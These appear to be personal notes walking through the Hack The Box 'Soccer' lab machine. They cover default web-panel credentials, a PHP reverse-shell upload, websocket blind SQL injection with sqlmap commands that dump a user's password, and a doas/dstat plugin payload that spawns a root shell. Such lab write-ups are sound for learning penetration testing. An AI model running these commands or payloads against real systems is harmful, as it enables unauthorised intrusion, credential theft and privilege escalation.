- nmap shows p 80 runs nginx
- aded ip in /etc/hosts for soccer.htb as i tried in browser
- dirbuster to find soccer.htb/tiny
- github gives usn and pd : admin, admin@123
- goto tiny/uploads and upload php reverse shell
- we gain reverse shell
	- whoami is www-data
- we find in /etc/nginx/sites-enabled theres another virtual host
	- we add to /etc/hosts : as its a subdomain we make sure the extra vhost is part of it in /etc/hosts so soc-player.soccer.htb
- goto site
	- **BLIND SQLi**
	- create account
	- login
	- ticket is new for every time you login
		- if we change the number the ticket doesnt match so this is some kind of simple boolean function
		- ticket no. + 'or 1=1'
			- also test 2=1 and another numbers and we see there is no check there
		- in burp suite we add intercept and then check the websocket which has this command and e get a response from client with a response ticket exists (sometimes need to turn off intercept and restart)
		- save to file (boolean.req)
	- pass sqlmap command :
	  **IMPORTANT NEW CODE**
	  - sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id": "*"}' --dbs --threads 10 --level 5 --risk 3 --batch
		  - i tried with technique=B for bolean and it did not work
		  - we identify DB soccer_db which will be our target
		  - pass command to check that DB
			- sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id": "*"}' --threads 10 -D soccer_db --dump --batch
			- [1 entry] OUTPUT
+------+-------------------+----------------------+----------+
| id   | email             | password             | username |
+------+-------------------+----------------------+----------+
| 1324 | player@player.htb | PlayerOftheMatch2022 | player   |
+------+-------------------+----------------------+----------+

- **PRIVILEGE ESCALATION WITHOUT SUDO i.e SETUID**
	- SETUID is a unix based security mechanism that allos executables to be run with privileges of file owner.
		- useful for executables that need to access system resources or perform actions that are typically restricted to privileged users, such as changing system settings or accessing other users' files.
		- **CAN BE USED TO PRIV ESC**
	- find files with SUID privileges :
		**NEW CODE**
		- find / -type f -perm -4000 2>/dev/null
			-  we notice /usr/local/bin/doas
			- **WHY is this interesting?!**
				- doas is not common
				- in /usr/local
					- **this is meant to be where admin specifically puts binaries**
						- **and what are binaries?** they are executables
						- so man doas to check what it idoes
							- we see its a BSD command i.e its the BSD version of sudo
								- BSD is another type of OS 
							- **we also see a /usr/local/etc/bin/doas.conf**
		- cat /usr/local/etc/doas.conf
			- output : permit nopass player as root cmd /usr/bin/dstat
		- man dstat
			- dstat - versatile tool for generating system resource statistics
			- EXECUTES PYTHON SCRIPTS
				- we see in man ouput under FILES:
					- FILES
				       Paths that may contain external dstat_*.py plugins:

			           ~/.dstat/
			           (path of binary)/plugins/
			           /usr/share/dstat/
			           /usr/local/share/dstat/
			- as we can see /usr/share/dstat we could add a python script here since we have root priv here (can check sites like GTFObins for this)
				- furthermore it needs to be saved in the format dstat_*.py
				- echo 'import os; os.system("/bin/bash")' > /usr/local/share/dstat/dstat_pwn.py
			- verify plugin is detected my dstat : --list command
				- doas /usr/bin/dstat --list 
					- should find your file pwn there 
			- EXECUTE DSTAT PLUGIN WITH DOAS
				- doas /usr/bin/dstat --pwn (dstat --plugin_name)
					- **WHY /usr/bin/dstat and not just dstat or another path?!**
						- when we did cat /usr/local/etc/doas.conf the output clearly states to use the path
						- **NOTE: the python file I created seems to delete itself after some time so this seems to be timegated**




